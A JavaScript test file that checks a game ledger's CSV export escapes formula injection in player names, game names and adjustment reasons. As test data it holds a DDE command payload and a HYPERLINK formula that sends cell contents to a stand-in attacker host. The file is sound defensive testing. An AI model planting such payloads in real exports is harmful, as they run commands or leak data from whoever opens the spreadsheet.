// Ledger CSV export (public/js/csv.js): text from players can't become spreadsheet formulas.
import { test } from 'node:test';
import assert from 'node:assert/strict';

import * as E from '../lib/engine.js';
import { viewFor } from '../lib/view.js';
import { csvCell, ledgerCsv } from '../public/js/csv.js';

test('csvCell: text starting with = + - @ tab or CR is neutralised; numbers stay numbers', () => {
  assert.equal(csvCell('=1+1'), "'=1+1");
  assert.equal(csvCell('+cmd|"/C calc"!A0'), '"\'+cmd|""/C calc""!A0"');
  assert.equal(csvCell('@SUM(1)'), "'@SUM(1)");
  assert.equal(csvCell('-2+3'), "'-2+3");
  assert.equal(csvCell('\tx'), "'\tx");
  assert.equal(csvCell('=HYPERLINK("http://ev.il/"&A1,"Pay")'), '"\'=HYPERLINK(""http://ev.il/""&A1,""Pay"")"');
  assert.equal(csvCell(-25), '-25');
  assert.equal(csvCell(0), '0');
  assert.equal(csvCell('Alice'), 'Alice');
  assert.equal(csvCell('a,b'), '"a,b"');
  assert.equal(csvCell(null), '');
});

test('ledgerCsv: hostile names, game name and adjust reason come out as plain text', () => {
  const ctx = { now: 1_700_000_000_000, rng: () => 0.5 };
  const s = E.createRoom(
    { code: 'CSV-0001', name: '=HYPERLINK("http://ev.il/"&A1,"Pay")', hostName: 'Host', hostId: 'h', hostTokenHash: 'x', settings: { approveBuyIns: false } },
    ctx,
  );
  E.addPlayer(s, { id: 'e', name: '=1+1', tokenHash: 'y' }, ctx);
  E.apply(s, 'e', { type: 'sit', seat: 1, amount: 200 }, ctx);
  E.apply(s, 'h', { type: 'adjust', pid: 'e', mode: 'add', amount: 5, reason: '+cmd|"/C calc"!A0', countAsBuyIn: false }, ctx);
  const csv = ledgerCsv(viewFor(s, 'h', 1, ctx.now), ctx.now);
  // every cell, unquoted, must not start with a formula character
  for (const line of csv.trim().split('\r\n')) {
    const cells = line.match(/("([^"]|"")*"|[^,]*)(,|$)/g).map((c) => c.replace(/,$/, '').replace(/^"|"$/g, '').replace(/""/g, '"'));
    for (const c of cells) assert.ok(!/^[=+@\t\r]/.test(c), `formula-looking cell ${JSON.stringify(c)} in line ${line}`);
  }
  assert.match(csv, /^Game,"'=HYPERLINK/m);
  assert.match(csv, /^'=1\+1,200,1,0,205,5/m);
  assert.match(csv, /adjustment,'=1\+1,5,no,"'\+cmd/);
});
